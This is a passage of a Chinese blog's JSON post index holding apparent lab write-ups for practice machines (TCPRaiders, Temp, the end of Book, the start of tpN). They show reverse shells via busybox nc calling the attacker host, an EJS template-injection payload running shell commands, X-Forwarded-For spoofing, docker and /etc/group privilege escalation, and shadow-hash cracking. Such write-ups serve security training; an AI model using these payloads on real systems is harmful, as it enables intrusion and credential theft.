 * \u5728Kali\u4e0a\uff0c\u4f7f\u7528SSH\u7684\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\u529f\u80fd\uff0c\u5c06\u76ee\u6807\u4e3b\u673a\u76848888\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730\u3002\n\n     ```bash\n     ssh -L 8888:127.0.0.1:8888 room@192.168.205.142\n     ```\n\n   * \u6253\u5f00\u672c\u5730\u6d4f\u89c8\u5668\u8bbf\u95ee `http://127.0.0.1:8888`\uff0c\u8fdb\u5165Jupyter\u767b\u5f55\u9875\u9762\uff0c\u8f93\u5165\u7834\u89e3\u51fa\u7684\u5bc6\u7801 `star123` \u6210\u529f\u767b\u5f55\u3002\n\n   * Jupyter Server\u5728\u6b64\u5904\u662f\u4ee5 `root` \u6743\u9650\u8fd0\u884c\u7684\u3002\u901a\u8fc7 `File > New > Terminal` \u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ec8\u7aef\uff0c\u76f4\u63a5\u83b7\u5f97 `root` \u6743\u9650\u7684shell\u3002\n\n   * \u6700\u540e\uff0c\u5728 `root` shell\u4e2d\u8bfb\u53d6\u4e24\u4e2aflag\u6587\u4ef6\u3002\n\n     ```bash\n     root@Book:~# id\n     uid=0(root) gid=0(root) groups=0(root)\n     root@Book:~# cat /root/root.txt /home/room/user.txt \n     flag{root-4f98663772651c870e911982e991d0d9}\n     flag{user-a81e1f271bc4a3dd4ac87827da4d0a78}\n     ```sentence", "top": 0, "createdAt": 1755215295, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-15", "dateLabelColor": "#0969da"}, "P213": {"htmlDir": "docs/post/nei-bu-_TCPRaiders.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_TCPRaiders", "postUrl": "post/nei-bu-_TCPRaiders.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/213", "commentNum": 0, "wordCount": 3616, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u626b\u63cf\u672c\u5730\u7f51\u7edc\uff0c\u4ee5\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.146        08:00:27:39:c8:97       PCS Systemtechnik GmbH\n...\n```\n\n\u4ece\u626b\u63cf\u7ed3\u679c\u53ef\u77e5\uff0c\u76ee\u6807\u9776\u673a\u7684IP\u5730\u5740\u4e3a `192.168.205.146`\u3002\n\n## **2. \u7aef\u53e3\u626b\u63cf**\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.146\n...\n0/tcp open  unknown\n...\n```\n\n0\u7aef\u53e3\u662f\u4e0d\u5141\u8bb8\u6d4f\u89c8\u5668\u8bbf\u95ee\u7684\uff0c\u6240\u4ee5\u8f6c\u53d1\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ socat TCP-LISTEN:8000,fork TCP4:192.168.205.146:0 &    \n[1] 23767\n```\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u521d\u59cb\u8bbf\u95ee**\n\n## 1.Web\n\n\u8bbf\u95ee\u672c\u57308000\u7aef\u53e3\n\n![image-20250815112328650](http://7r1UMPHK.github.io/image/20250815213356794.webp)\n\n\u5c1d\u8bd5curl\u52a9\u529b\u94fe\u63a5\u663e\u793a\u52a9\u529b\u6210\u529f\uff0c\u5e76\u4e14\u91cd\u65b0curl\u663e\u793a\u52a9\u529b\u8fc7\u4e86\uff0c\u5e94\u8be5\u662f\u5b58\u5728IP\u68c0\u6d4b\u7684\u95ee\u9898\u3002\u6d4b\u8bd5\u53d1\u73b0\uff0c\u8be5IP\u68c0\u6d4b\u53ea\u68c0\u6d4bIP\u5730\u5740\u7684\u524d16\u4f4d\uff0c\u5373 `x.x.1.1` \u683c\u5f0f\u5373\u53ef\uff0c\u90a3\u5199\u6279\u91cf\u52a9\u529b\u811a\u672c\u3002\n\n```perl\nperl -MLWP::UserAgent -e '$ua=LWP::UserAgent->new(timeout=>1);for $i (0..255){for $j (0..255){$ip='$i.$j.1.1';$ua->get('http://192.168.205.128:8000/support?token=eb0c6310-07b2-4609-9f3e-4a59ce09949a','X-Forwarded-For'=>$ip);print '$ip\\n';}}'\n```\n\n\u5728\u811a\u672c\u6267\u884c\u5b8c\u6210\u540e\uff0c\u518d\u6b21\u8bbf\u95eeWeb\u670d\u52a1\uff0c\u53d1\u73b0\u4e4b\u524d\u9690\u85cf\u7684\u9875\u9762\u662fWebshell\u3002\n\n## **2. \u83b7\u53d6\u53cd\u5f39Shell**\n\n\u901a\u8fc7\u65b0\u51fa\u73b0\u7684Webshell\u754c\u9762\uff0c\u6211\u4eec\u6267\u884c\u53cd\u5f39shell\u547d\u4ee4\u3002\u7531\u4e8e\u76ee\u6807\u7cfb\u7edf\u4e3a Alpine Linux\uff0c\u5b83\u9ed8\u8ba4\u4e0d\u5305\u542b `bash`\uff0c\u56e0\u6b64\u6211\u4eec\u4f7f\u7528 `busybox` \u5185\u7f6e\u7684 `nc` \u548c `ash` \u6765\u83b7\u53d6\u53cd\u5f39shell\u3002\n\n**\u672c\u5730Kali\u5f00\u542f\u76d1\u542c:**\n\n```bash\nnc -lvnp 8888\n```\n\n**\u5728Webshell\u4e2d\u6267\u884cPayload:**\n\n```bash\nbusybox nc 192.168.205.128 8888 -e /bin/ash\n```\n\n\u6267\u884c\u540e\uff0c\u5728\u672c\u5730 `8888` \u7aef\u53e3\u6210\u529f\u63a5\u6536\u5230 `runner` \u7528\u6237\u7684\u4ea4\u4e92\u5f0fShell\u3002\n\n## **3. \u7a33\u5b9aShell**\n\n```\npython3 -c 'import pty; pty.spawn('/bin/ash')'\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/ash\nstty rows 24 columns 80\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. runner -> luna**\n\n\u83b7\u53d6\u521d\u6b65Shell\u540e\uff0c\u6267\u884c `sudo -l` \u67e5\u770b\u5f53\u524d\u7528\u6237\u7684 `sudo` \u6743\u9650\u3002\n\n```bash\n/opt/web $ sudo -l\n...\nUser runner may run the following commands on tcpraiders:\n    (luna) NOPASSWD: /usr/sbin/luna\n```\n\n\u7ed3\u679c\u663e\u793a `runner` \u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u4ee5 `luna` \u7528\u6237\u8eab\u4efd\u8fd0\u884c `/usr/sbin/luna` \u7a0b\u5e8f\u3002\n\n\u5c1d\u8bd5\u6267\u884c\u8be5\u7a0b\u5e8f\uff0c\u53d1\u73b0\u5b83\u4f1a\u8f93\u51fa\u4e00\u6bb5\u53cd\u5411\u7684\u82f1\u6587\u5b57\u7b26\u4e32\uff0c\u5e76\u7b49\u5f85\u8f93\u5165\u3002\n\n```bash\n/opt/web $ sudo -u luna /usr/sbin/luna\n.yranoitcid eht ni semit 511 dnuof neeb sah tI .kaew oot si drowssap ruoY :TRELA\n\n# \u4f7f\u7528rev\u547d\u4ee4\u53cd\u8f6c\u5b57\u7b26\u4e32\n/opt/web $ sudo -u luna /usr/sbin/luna | rev\nALERT: Your password is too weak. It has been found 115 times in the dictionary.\n```\n\n\u8fd9\u660e\u663e\u662f\u4e00\u4e2a\u5bc6\u7801\u9a8c\u8bc1\u7a0b\u5e8f\u3002\u7a0b\u5e8f\u903b\u8f91\u53ef\u80fd\u662f\u5c06\u7528\u6237\u8f93\u5165\u4e0e\u67d0\u4e2a\u6b63\u786e\u5bc6\u7801\u8fdb\u884c\u6bd4\u8f83\u3002\u8003\u8651\u5230\u63d0\u793a\u4fe1\u606f\uff0c\u8be5\u7a0b\u5e8f\u53ef\u80fd\u5c06\u7528\u6237\u7684\u8f93\u5165\u8fdb\u884c\u53cd\u5411\u5904\u7406\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u53cd\u5411\u7684\u5b57\u5178\u8fdb\u884c\u7206\u7834\u3002\n\n\u6211\u4eec\u4f7f\u7528 `rockyou.txt` \u5b57\u5178\uff0c\u5c06\u5176\u6574\u672c\u53cd\u8f6c\u540e\uff0c\u901a\u8fc7\u7ba1\u9053\u7b26\u548c\u5faa\u73af\u6765\u7206\u7834\u5bc6\u7801\u3002\n\n```bash\n# \u5728/tmp\u76ee\u5f55\u51c6\u5907\u53cd\u8f6c\u540e\u7684\u5b57\u5178\ncd /tmp\nwget http://192.168.205.128/rockyou.txt\nrev rockyou.txt > pass\n\n# \u6267\u884c\u7206\u7834\u811a\u672c\necho 'hold on...' && while read p; do echo '$p' | sudo -u luna /usr/sbin/\nluna | grep -q tcerrocnI || { echo '[+] Found: $p'; break; }; done < pass\nhold on...\n/tmp $ \n[+] Found: ebyam\n```\n\n\u6210\u529f\u627e\u5230\u5bc6\u7801\u4e3a `ebyam`\u3002\u73b0\u5728\uff0c\u6211\u4eec\u6267\u884c `/usr/sbin/luna` \u5e76\u8f93\u5165\u8be5\u5bc6\u7801\uff0c\u6210\u529f\u5207\u6362\u5230 `luna` \u7528\u6237\u3002\n\n```bash\n/opt $ sudo -u luna /usr/sbin/luna\n drowssaP: ebyam\n/opt $ id\nuid=1001(luna) gid=1001(luna) groups=1001(luna)\n```\n\n## **2. luna -> root**\n\n\u5728 `luna` \u7528\u6237\u7684shell\u4e2d\uff0c\u518d\u6b21\u6267\u884c `sudo -l`\u3002\n\n```bash\n/opt $ sudo -l\n...\nUser luna may run the following commands on tcpraiders:\n    (ALL) NOPASSWD: /usr/bin/docker build *, /usr/bin/docker run *\n```\n\n\u53d1\u73b0 `luna` \u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u4ee5 `root` \u6743\u9650\u6267\u884c\u4efb\u610f `docker build` \u548c `docker run` \u547d\u4ee4\u3002\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684\u63d0\u6743\u8def\u5f84\u3002\u7531\u4e8e\u9776\u673a\u53ef\u4ee5\u8bbf\u95ee\u5916\u7f51\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u62c9\u53d6\u4e00\u4e2a\u955c\u50cf\u6765\u5229\u7528\u3002\n\n\u6211\u4eec\u5229\u7528 `docker run` \u547d\u4ee4\uff0c\u5c06\u5bbf\u4e3b\u673a\u7684\u6839\u76ee\u5f55 `/` \u6302\u8f7d\u5230\u5bb9\u5668\u7684 `/mnt` \u76ee\u5f55\uff0c\u7136\u540e\u5728\u5bb9\u5668\u5185\u6267\u884c `chroot /mnt`\uff0c\u4ece\u800c\u83b7\u5f97\u5bbf\u4e3b\u673a\u7684 `root` shell\u3002\n\n```bash\n/opt $ sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh\nUnable to find image 'alpine:latest' locally\nlatest: Pulling from library/alpine\n...\nStatus: Downloaded newer image for alpine:latest\n/ # id\nuid=0(root) gid=0(root) groups=0(root),...\n```\n\n\u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u3002\u6700\u540e\uff0c\u8bfb\u53d6\u4f4d\u4e8e\u7528\u6237\u76ee\u5f55\u548c `root` \u76ee\u5f55\u4e0b\u7684 flag \u6587\u4ef6\u3002\n\n```bash\n/ # cat /root/root.flag /home/luna/user.flag\nflag{641d35852cd6fdaab8a6a621d40c3d5ac2b453aa}\nflag{1b925e677f649ce856f61e3846466252e75cc179}\n```\n\nsentence", "top": 0, "createdAt": 1755264878, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-15", "dateLabelColor": "#0969da"}, "P214": {"htmlDir": "docs/post/nei-bu-_Temp.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Temp", "postUrl": "post/nei-bu-_Temp.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/214", "commentNum": 0, "wordCount": 5315, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n\u9996\u5148\uff0c\u5728\u76ee\u6807\u7f51\u6bb5\u5185\u4f7f\u7528`arp-scan`\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u4ee5\u786e\u5b9a\u76ee\u6807\u7684IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n...\n192.168.205.132 08:00:27:72:8f:66       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u5b9a\u76ee\u6807IP\u4e3a `192.168.205.132` \u540e\uff0c\u4f7f\u7528`nmap`\u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u63a2\u6d4b\u5f00\u653e\u7684\u7aef\u53e3\u548c\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.132\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 09:47 EDT\nNmap scan report for 192.168.205.132\nHost is up (0.00013s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3000/tcp open  ppp\nMAC Address: 08:00:27:72:8F:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u653e\u4e8622 (SSH)\u300180 (HTTP) \u548c 3000 (PPP, \u5b9e\u9645\u4e3aWeb\u670d\u52a1) \u7aef\u53e3\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u5229\u7528**\n\n\u8bbf\u95ee\u76ee\u680780\u7aef\u53e3\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u540d\u4e3a 'Safe Welcome Message Processor' \u7684Web\u5e94\u7528\u3002\u8bbf\u95ee3000\u7aef\u53e3\uff0c\u5219\u662f\u4e00\u4e2a\u529f\u80fd\u76f8\u4f3c\u7684 'Welcome Message Processor' \u5e94\u7528\u3002\n\n\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53d1\u73b03000\u7aef\u53e3\u7684Web\u5e94\u7528\u5b58\u5728\u670d\u52a1\u5668\u7aef\u6a21\u677f\u6ce8\u5165\uff08SSTI\uff09\u6f0f\u6d1e\u3002\u901a\u8fc7\u63d0\u4ea4payload `<%= 7*7 %>`\uff0c\u670d\u52a1\u5668\u6210\u529f\u6267\u884c\u4e86\u4e58\u6cd5\u8fd0\u7b97\u5e76\u8fd4\u56de\u4e86\u7ed3\u679c `49`\uff0c\u786e\u8ba4\u4e86\u6f0f\u6d1e\u7684\u5b58\u5728\u3002\n\n![image-20250815215732917](http://7r1UMPHK.github.io/image/20250815224342800.webp)\n\n\u4e3a\u4e86\u8fdb\u4e00\u6b65\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u6784\u9020\u4e86\u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684payload\u3002\u8be5payload\u5229\u7528Node.js\u7684`child_process`\u6a21\u5757\u6765\u6267\u884c`id`\u547d\u4ee4\uff0c\u5e76\u56de\u663e\u7ed3\u679c\u3002\n\n**\u547d\u4ee4\u6267\u884cPayload:**\n\n```javascript\n<% const require = this.process.mainModule.require; const { execSync } = require('child_process'); const output = execSync('id'); %><%= output %>\n```\n\n![image-20250815215910295](http://7r1UMPHK.github.io/image/20250815224346104.webp)\n\n\u670d\u52a1\u5668\u6210\u529f\u8fd4\u56de\u4e86`uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)`\uff0c\u8868\u660e\u547d\u4ee4\u5df2\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u4ee5`welcome`\u7528\u6237\u8eab\u4efd\u6267\u884c\u3002\n\n\u63a5\u4e0b\u6765\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u4e00\u4e2a\u53cd\u5411shell\u3002\u9996\u5148\u5728Kali\u653b\u51fb\u673a\u4e0a\u8bbe\u7f6eNetcat\u76d1\u542c8888\u7aef\u53e3\u3002\n\n**Kali\u76d1\u542c:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\n```\n\n\u7136\u540e\uff0c\u5728Web\u9875\u9762\u63d0\u4ea4\u53cd\u5f39shell\u7684payload\u3002\n\n**\u53cd\u5f39Shell Payload:**\n\n```javascript\n<% const require = this.process.mainModule.require; const { execSync } = require('child_process'); const output = execSync('busybox nc 192.168.205.128 8888 -e /bin/bash'); %><%= output %>\n```\n\n\u63d0\u4ea4\u540e\uff0c\u6210\u529f\u5728Kali\u4e0a\u63a5\u6536\u5230\u6765\u81ea\u76ee\u6807\u4e3b\u673a\u7684shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 43342\nid\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n```\n\n\u4e3a\u4e86\u83b7\u5f97\u66f4\u597d\u7684\u4ea4\u4e92\u4f53\u9a8c\uff0c\u5bf9\u83b7\u53d6\u7684shell\u8fdb\u884c\u7a33\u5b9a\u5316\u5904\u7406\u3002\n\n```bash\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n\u5728\u83b7\u53d6\u4e86`welcome`\u7528\u6237\u7684shell\u540e\uff0c\u5f00\u59cb\u8fdb\u884c\u63d0\u6743\u64cd\u4f5c\u3002\u9996\u5148\uff0c\u68c0\u67e5\u7528\u6237\u7684`sudo`\u6743\u9650\u3002\n\n```bash\nwelcome@Temp:/opt/ssti-welcome$ sudo -l\n...\nUser welcome may run the following commands on Temp:\n    (ALL) NOPASSWD: /usr/sbin/reboot\n```\n\n`sudo -l`\u7ed3\u679c\u663e\u793a`welcome`\u7528\u6237\u53ea\u80fd\u4ee5`NOPASSWD`\u65b9\u5f0f\u6267\u884c`/usr/sbin/reboot`\u547d\u4ee4\uff0c\u6b64\u6743\u9650\u5bf9\u63d0\u6743\u6ca1\u6709\u76f4\u63a5\u5e2e\u52a9\u3002\n\n\u63a5\u7740\uff0c\u5728\u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u53d1\u73b0\u5e76\u8bfb\u53d6\u4e86`user.txt`\u6587\u4ef6\uff0c\u83b7\u5f97\u4e86\u7b2c\u4e00\u4e2aflag\u3002\n\n```bash\nwelcome@Temp:~$ cat user.txt\nflag{user-12f54a96f64443246930da001cafda8b}\n```\n\n\u4e3a\u4e86\u66f4\u5168\u9762\u5730\u6536\u96c6\u7cfb\u7edf\u4fe1\u606f\uff0c\u4e0a\u4f20\u5e76\u6267\u884c`linpeas.sh`\u811a\u672c\u8fdb\u884c\u81ea\u52a8\u5316\u679a\u4e3e\u3002\n\n```bash\nwelcome@Temp:~$ cd /tmp\nwelcome@Temp:/tmp$ busybox wget 192.168.205.128/linpeas.sh\nwelcome@Temp:/tmp$ bash /tmp/linpeas.sh\n...\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Interesting writable files owned by me or writable by everyone (not in Home) (max 200)\n\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files\n...\n/etc/group\n...\n```\n\n`linpeas`\u7684\u626b\u63cf\u7ed3\u679c\u663e\u793a`/etc/group`\u6587\u4ef6\u5bf9\u4e8e\u5f53\u524d\u7528\u6237\u662f\u53ef\u5199\u7684\uff0c\u8fd9\u662f\u4e00\u4e2a\u5173\u952e\u7684\u63d0\u6743\u5411\u91cf\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8be5\u6587\u4ef6\uff0c\u5c06`welcome`\u7528\u6237\u6dfb\u52a0\u5230`sudo`\u6216`shadow`\u7b49\u9ad8\u6743\u9650\u7528\u6237\u7ec4\u3002\n\n\u4e3a\u4e86\u80fd\u591f\u8bfb\u53d6`/etc/shadow`\u6587\u4ef6\u4ee5\u7834\u89e3\u7528\u6237\u5bc6\u7801\uff0c\u51b3\u5b9a\u5c06`welcome`\u7528\u6237\u6dfb\u52a0\u5230`shadow`\u7ec4\u3002\n\n## **1. \u914d\u7f6eSSH\u514d\u5bc6\u767b\u5f55**\n\n\u7531\u4e8e\u4e0d\u77e5\u9053`welcome`\u7528\u6237\u7684\u5bc6\u7801\uff0c\u65e0\u6cd5\u76f4\u63a5\u5207\u6362\u7ec4\u3002\u56e0\u6b64\uff0c\u9996\u5148\u914d\u7f6eSSH\u514d\u5bc6\u767b\u5f55\uff0c\u4ee5\u4fbf\u5728\u4fee\u6539`/etc/group`\u540e\u80fd\u4ee5\u65b0\u7ec4\u7684\u8eab\u4efd\u91cd\u65b0\u767b\u5f55\u3002\n\n\u5728`welcome`\u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u521b\u5efa`.ssh`\u76ee\u5f55\uff0c\u5e76\u4eceKali\u653b\u51fb\u673a\u4e0b\u8f7d`authorized_keys`\u6587\u4ef6\u3002\n\n```bash\nwelcome@Temp:~$ mkdir .ssh\nwelcome@Temp:~$ cd .ssh/\nwelcome@Temp:~/.ssh$ busybox wget 192.168.205.128/authorized_keys\n```\n\n## **2. \u4fee\u6539`/etc/group`**\n\n\u4f7f\u7528`vim`\u6216\u5176\u4ed6\u7f16\u8f91\u5668\u6253\u5f00`/etc/group`\u6587\u4ef6\uff0c\u5c06`welcome`\u7528\u6237\u6dfb\u52a0\u5230`shadow`\u7ec4\u548c`sudo`\u7ec4\u3002\n\n```bash\nwelcome@Temp:~/.ssh$ vim /etc/group\n```\n\n\u4fee\u6539\u540e\u7684\u5185\u5bb9\u5982\u4e0b\uff1a\n\n```\n...\nsudo:x:27:welcome\n...\nshadow:x:42:welcome\n...\n```\n\n## **3. \u8bfb\u53d6shadow\u6587\u4ef6\u5e76\u7834\u89e3\u5bc6\u7801**\n\n\u4fee\u6539\u5b8c\u6210\u540e\uff0c\u4eceKali\u653b\u51fb\u673a\u901a\u8fc7SSH\u8fde\u63a5\u5230\u76ee\u6807\uff0c\u6b64\u65f6`welcome`\u7528\u6237\u5df2\u5177\u5907`shadow`\u7ec4\u7684\u6743\u9650\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6`/etc/shadow`\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh welcome@192.168.205.132\n...\nwelcome@Temp:~$ cat /etc/shadow\nroot:$6$OJ3tCiDX7okU1mml$K5.VqI9J/kSkDxb.et6AWCJnfN0//2VmsjZlwdBCeDK2MgHpojEVMs7hd3FAuQ1EYIJpHnUMMR.pz3uQvpzGr1:20293:0:99999:7:::\n...\nwelcome:$6$5aPJr2PfLEe1OJqk$vcaYOfDgCNO.G.PkNFM0Lj2CS803S5FSogWPHcZSPTSjSEec1YveEGhJ0JXnEGlzRxx1BlH0UJeIIbP7RN2XT.:20293:0:99999:7:::\n```\n\n\u5c06`welcome`\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u4fdd\u5b58\u4e0b\u6765\uff0c\u4f7f\u7528`John the Ripper`\u548c`rockyou.txt`\u5b57\u5178\u8fdb\u884c\u7834\u89e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo 'welcome:$6$5aPJr2PfLEe1OJqk$vcaYOfDgCNO.G.PkNFM0Lj2CS803S5FSogWPHcZSPTSjSEec1YveEGhJ0JXnEGlzRxx1BlH0UJeIIbP7RN2XT.' > hash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\n...\nsainsburys       (welcome)\n...\nSession completed.\n```\n\n\u6210\u529f\u7834\u89e3\u51fa`welcome`\u7528\u6237\u7684\u5bc6\u7801\u4e3a `sainsburys`\u3002\n\n## **4. \u83b7\u53d6Root\u6743\u9650**\n\n\u7531\u4e8e\u4e4b\u524d\u5df2\u5c06`welcome`\u7528\u6237\u6dfb\u52a0\u5230\u4e86`sudo`\u7ec4\uff0c\u73b0\u5728\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u7834\u89e3\u51fa\u7684\u5bc6\u7801\u5207\u6362\u5230root\u7528\u6237\u3002\n\n```bash\nwelcome@Temp:~$ sudo bash\n[sudo] password for welcome: sainsburys\nroot@Temp:/home/welcome# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6210\u529f\u83b7\u53d6root\u6743\u9650\u540e\uff0c\u8bfb\u53d6`/root/root.txt`\u548c`/home/welcome/user.txt`\uff0c\u83b7\u5f97\u6240\u6709flag\u3002\n\n```bash\nroot@Temp:/home/welcome# cat /root/root.txt /home/welcome/user.txt\nflag{root-60b725f10c9c85c70d97880dfe8191b3}\nflag{user-12f54a96f64443246930da001cafda8b}\n```\n\nsentence", "top": 0, "createdAt": 1755269292, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-15", "dateLabelColor": "#0969da"}, "P215": {"htmlDir": "docs/post/nei-bu-_tpN.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_tpN", "postUrl": "post/nei-bu-_tpN.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/215", "commentNum": 0, "wordCount": 6137, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u5728\u5f53\u524d\u7f51\u6bb5\u5185\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u786e\u5b9a\u76ee\u6807IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l           \n...\n192.168.205.131 08:00:27:2b:fe:37       PCS Systemtechnik GmbH\n...\n```\n\n\u53d1\u73b0\u5b58\u6d3b\u4e3b\u673a `192.168.205.131`\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 Nmap \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.131\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 20:21 EDT\nNmap scan report for 192.168.205.131\nHost is up (0.00017s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\nMAC Address: 08:00:27:2B:FE:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u653e\u4e86\u4e24\u4e2a\u7aef\u53e3\uff1a\n\n*   **22/tcp**: SSH \u670d\u52a1\n*   **8080/tcp**: HTTP \u670d\u52a1\n\n# \u4e8c\u3001Web\u6e17\u900f\n\n## 1. Web\u5e94\u7528\u8bc6\u522b\n\n\u8bbf\u95ee `http://192.168.205.131:8080`\uff0c\u9875\u9762\u663e\u793a\u4e3a\u4e00\u4e2a\u8d5b\u535a\u670b\u514b\u98ce\u683c\u7684\u7f51\u7ad9\u3002\n\n```html\n<body>\n    <h1>\u6b22\u8fce\u6765\u5230\u8d5b\u535a\u670b\u514b\u4e16\u754c</h1>\n   